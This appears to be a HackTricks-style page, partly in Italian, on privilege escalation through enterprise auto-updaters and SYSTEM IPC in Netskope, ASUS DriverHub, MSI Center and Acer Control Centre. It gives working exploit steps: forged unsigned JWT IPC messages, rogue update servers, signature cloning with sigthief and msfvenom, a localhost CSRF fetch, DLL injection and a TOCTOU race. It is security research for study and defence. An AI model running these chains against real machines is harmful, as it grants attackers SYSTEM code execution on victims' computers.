# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di local privilege escalation su Windows trovate in agent endpoint enterprise e updaters che espongono una superficie IPC a bassa\-friction e un flusso di update privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), dove un utente a basso privilegio può forzare l'enrollment verso un server controllato dall'attaccante e poi consegnare un MSI maligno che il servizio SYSTEM installa.

Idee chiave riutilizzabili contro prodotti simili:
- Abusare della localhost IPC di un servizio privilegiato per forzare il re\-enrollment o la reconfigurazione verso un server controllato dall'attaccante.
- Implementare gli update endpoints del vendor, consegnare una Trusted Root CA rogue e puntare l'updater verso un package maligno “signed”.
- Evadere controlli deboli del signer (CN allow\-lists), flag digest opzionali, e proprietà MSI permissive.
- Se l'IPC è “encrypted”, derivare la key/IV da identificatori macchina world\-readable memorizzati nel registro.
- Se il servizio limita i caller per image path/process name, iniettare in un processo allow\-listed o spawnarne uno suspended e bootstrappare la tua DLL tramite una patch minimale del thread\-context.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Molti agenti forniscono un processo UI user\-mode che parla con un servizio SYSTEM su localhost TCP usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso dell'exploit:
1) Crea un token di enrollment JWT i cui claim controllano l'host backend (es. AddonUrl). Usa alg=None in modo che non sia richiesta una firma.
2) Invia il messaggio IPC invocando il comando di provisioning con il tuo JWT e il nome del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a contattare il tuo rogue server per enrollment/config, ad es.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la caller verification è path/name\-based, origina la richiesta da un allow\-listed vendor binary (vedi §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoints attesi e indirizzalo verso un attacker MSI. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci la config JSON con un intervallo di aggiornamento molto breve, ad es.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA in formato PEM. Il servizio lo installa nello store Trusted Root della macchina locale.
3) /v2/checkupdate → Fornisce metadata che puntano a un MSI malevolo e a una versione finta.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attaccanti possono riprodurre la crittografia e inviare comandi crittografati validi da un utente standard. Suggerimento generale: se un agent improvvisamente “crittografa” il suo IPC, cerca device ID, product GUID, install ID sotto HKLM come materiale.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Alcuni servizi cercano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il percorso/nome dell'immagine con i vendor binaries allow\-listed situati sotto Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow\-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow\-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver\-enforced tamper rules.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user\-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed\-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in\-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already\-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES\-encrypted) IPC messages and includes the suspended\-process injection to originate from an allow\-listed binary.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user\-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker\-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state\-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Flusso pratico:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Anche la CLI di PowerShell mostrata qui sotto funziona quando l'header Origin viene falsificato con il valore attendibile:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Ogni visita del browser al sito dell'attaccante diventa quindi un CSRF locale a 1\-click (o 0\-click tramite `onload`) che avvia un helper SYSTEM.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel body JSON e li mette in cache in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validazione della URL di download riusa la stessa logica basata su substring, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettata. Dopo il download, ADU.exe si limita a verificare che il PE contenga una signature e che la Subject string corrisponda a ASUS prima di eseguirlo – nessun `WinVerifyTrust`, nessuna validazione della catena.

Per weaponizzare il flusso:
1) Creare un payload (es., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonare il signer di ASUS nel payload (es., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospitare `pwn.exe` su un dominio lookalike `.asus.com` e triggerare UpdateApp tramite il CSRF del browser di cui sopra.

Poiché sia il filtro Origin che quello URL sono basati su substring e il controllo del signer confronta solo stringhe, DriverHub scarica ed esegue il binario dell'attaccante nel suo contesto elevato.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP dove ogni frame è `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente core (Component ID `0f 27 00 00`) fornisce `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il suo handler:
1) Copia l'eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la signature tramite `CS_CommonAPI.EX_CA::Verify` (il subject del certificato deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve riuscire).
3) Crea una scheduled task che esegue il file temporaneo come SYSTEM con argomenti controllati dall'attaccante.

Il file copiato non è bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare Frame A che punta a un binario firmato da MSI legittimo (garantisce che la verifica della signature passi e la task venga accodata).
- Gareggiarci con messaggi Frame B ripetuti che puntano a un payload maligno, sovrascrivendo `MSI Center SDK.exe` subito dopo che la verifica è terminata.

Quando lo scheduler scatta, esegue il payload sovrascritto come SYSTEM nonostante fosse stato validato il file originale. Uno sfruttamento affidabile usa due goroutine/thread che spammano CMD_AutoUpdateSDK finché la finestra TOCTOU non viene vinta.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato sotto `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, permettendo agli attaccanti di indirizzare comandi a moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` senza **alcuna verifica della signature** – qualsiasi utente locale può puntarlo a `C:\Users\<user>\Desktop\payload.exe` e ottenere l'esecuzione come SYSTEM in modo deterministico.
- Sniffare il loopback con Wireshark o strumentare i binari .NET in dnSpy rivela rapidamente la mappatura Component ↔ command; client custom in Go/Python possono quindi riprodurre i frame.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode`, e il suo discretionary ACL permette client remoti (es., `\\TARGET\pipe\treadstone_service_LightMode`). Inviare command ID `7` con un file path invoca la routine di spawning del processo del servizio.
- La libreria client serializza un magic terminator byte (113) insieme agli args. La strumentazione dinamica con Frida/`TsDotNetLib` (vedi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per consigli sulla strumentazione) mostra che l'handler nativo mappa questo valore a un `SECURITY_IMPERSONATION_LEVEL` e a un integrity SID prima di chiamare `CreateProcessAsUser`.
- Sostituire 113 (`0x71`) con 114 (`0x72`) passa nel branch generico che mantiene il token SYSTEM completo e imposta un high-integrity SID (`S-1-16-12288`). Il binario spawnato quindi gira come SYSTEM senza restrizioni, sia localmente che cross-machine.
- Combina questo con il flag installer esposto (`Setup.exe -nocheck`) per avviare ACC anche su VM di laboratorio e testare la pipe senza hardware vendor.

Questi bug di IPC evidenziano perché i servizi localhost devono far rispettare l'autenticazione reciproca (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) e perché l'helper “run arbitrary binary” di ogni modulo deve condividere le stesse verifiche del signer.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
